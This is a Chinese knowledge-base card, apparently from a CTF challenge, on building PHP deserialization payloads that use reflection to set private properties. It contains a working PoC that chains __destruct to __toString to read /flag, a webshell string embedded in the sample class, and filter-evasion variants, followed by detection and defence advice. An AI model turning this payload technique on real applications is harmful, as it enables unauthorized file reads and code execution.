---
id: web-php-deserialization-reflection-private-property-payload
title: PHP 反序列化 EXP：ReflectionClass 改写私有属性触发 __destruct 到 __toString 读文件
type: scenario
domain: web
path: web/php/deserialization
technique: reflection-set-private-property-gadget-payload
tags:
- php
- deserialization
- reflection
- private-property
- magic-method
- payload-crafting
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V16
  verified_at: '2026-11-05T01:57:36+08:00'
  notes: 已对照原文核对（原文无图片）：polarD&N 题用 ReflectionClass->getProperty('debugMode')->setAccessible(true)->setValue(,true) 改写 private 属性，令 __destruct 走 echo 分支并触发 FlagReader::__toString 读 /flag；入口 base64+unserialize。卡内 PoC 与原理一致，并正确注明 PHP8.1+ setAccessible 变化及序列化私有属性 \0 前缀。PoC 未本机执行；frontmatter无sources/source_url。
url: /docs/web/php/deserialization/web-php-deserialization-reflection-private-property-payload/
draft: false
kb_aliases:
- ReflectionClass 修改私有属性
- PHP 反序列化私有属性构造
- setAccessible 构造 payload
- __destruct 触发 __toString
- PHP 对象注入 EXP 生成
---

## 一句话结论

构造 PHP 反序列化 EXP 时，若利用链依赖 `private`/`protected` 属性作为开关，无法在类外直接赋值，可用 `ReflectionClass::getProperty()->setAccessible(true)->setValue()` 改写这些字段，再配合公有属性组装对象图，反序列化后由 `__destruct` 等魔术方法触发 `__toString` 等危险逻辑。

## 原理

- PHP 的 `private`/`protected` 属性禁止类外直接访问与赋值；但在生成 payload 的一端，攻击者可以执行任意 PHP 代码，因此能用反射绕过作用域限制。
- `new ReflectionClass($obj)` 取得对象的反射；`getProperty('field')` 取得 `ReflectionProperty`；`setAccessible(true)` 解除访问控制；`setValue($obj, $value)` 写入属性。这样就能把类内部逻辑依赖的私有开关从默认值改为攻击者需要的值。
- 反序列化只恢复对象属性，不会调用构造函数，但会在对象销毁时调用 `__destruct`，在对象被当字符串使用时调用 `__toString`；因此“私有布尔开关 + 公有可控对象”的组合可以组成完整链。
- 原文靶场链：`VulnerableClass::__destruct` 在 `debugMode=true` 时执行 `echo $this->logger`；把 `logger` 设为 `FlagReader` 实例后，`echo` 触发 `FlagReader::__toString`，其内部 `file_get_contents('/flag')` 读取 flag。`debugMode` 是 private，必须用反射改成 true。
- 入口只允许 base64 字符集，故 payload 需 base64 编码后再 `unserialize(base64_decode(...))`；反序列化对象的 destructor 在请求结束、对象释放时触发。

## 触发条件

- 存在 `unserialize()` 可控输入（直接或 Phar 等二次触发）。
- 目标类中存在依赖 private/protected 属性值的魔术方法链（`__destruct`、`__wakeup`、`__toString` 等）。
- 生成端可执行 PHP（攻击者本地构造 payload）；目标 PHP 版本支持反射（PHP5+，PHP8.1+ 对 `setAccessible` 行为有变化但仍可访问私有属性）。
- 危险魔术方法在对象销毁/字符串化时确实被执行。

## 利用步骤

1. 审计目标类，找出魔术方法中的危险分支及其依赖的私有/受保护字段。
2. 在 EXP 中实例化链上对象（无需构造函数时可用 `newInstanceWithoutConstructor`）。
3. 对每个 private/protected 字段调用 `ReflectionProperty::setAccessible(true)` 后 `setValue`。
4. 设置公有字段，把对象按链顺序串联（如把 `FlagReader` 赋给 `VulnerableClass->logger`）。
5. `serialize()` 后按入口要求编码（base64/URL 编码等）发送。
6. 观察 destructor 触发后的文件读取/命令执行结果。

## PoC

```php
<?php
class FlagReader {
    private $logfile = "/tmp/log.txt";
    protected $content = "<?php system(\$_GET['cmd']); ?>";
    public function __toString() {
        return file_exists('/flag') ? file_get_contents('/flag') : "Flag file not found!";
    }
}
class VulnerableClass {
    public $logger;
    private $debugMode = false;
    public function __destruct() {
        if ($this->debugMode) {
            echo $this->logger;      // 触发 FlagReader::__toString
        }
    }
}

$flag = new FlagReader();
$vuln = new VulnerableClass();

$ref = new ReflectionClass($vuln);
$prop = $ref->getProperty('debugMode');   // private
$prop->setAccessible(true);               // 解除 private 限制
$prop->setValue($vuln, true);             // 打开危险分支

$vuln->logger = $flag;
echo base64_encode(serialize($vuln));
```

入口按 base64 解码后 `unserialize`，脚本结束销毁对象时输出 `/flag` 内容。

## 变体与关联

- 变体：直接用 `new ReflectionProperty($obj, 'field')`；对 protected 字段同样适用。
- 变体：PHP 8.1+ 中 `setAccessible()` 对反射访问私有属性不再必需，但保留调用可兼容旧版本。
- 变体：若入口过滤序列化字符串中的类名/字段名，可结合大小写、转义或 Phar 触发；私有属性名在序列化流中带 `\0类名\0字段` 前缀。
- 关联：[[web-php-deserialization-magic-chain-eval-wakeup-bypass]]（魔术方法链与 wakeup 绕过）；[[web-php-deserialization-pop-filelogger-webshell]]（POP 链构造）。
- 边界：目标没有可用魔术方法链、private 字段不影响危险分支、或入口禁止反序列化时，本手法无效。

## 检测与防御

- 检测：请求体/base64 解码后出现 `O:` 序列化对象且属性名含 `\0*\0`/`\0类名\0`；应用出现非预期的反射调用或对象反序列化异常。
- 防御：禁止对不可信输入使用 `unserialize()`，改用 JSON；必须使用时用 `allowed_classes` 白名单。
- 加固：不要用私有布尔字段单独控制危险魔术方法；魔术方法内对参数与对象类型做严格校验；生产环境关闭 `display_errors`。
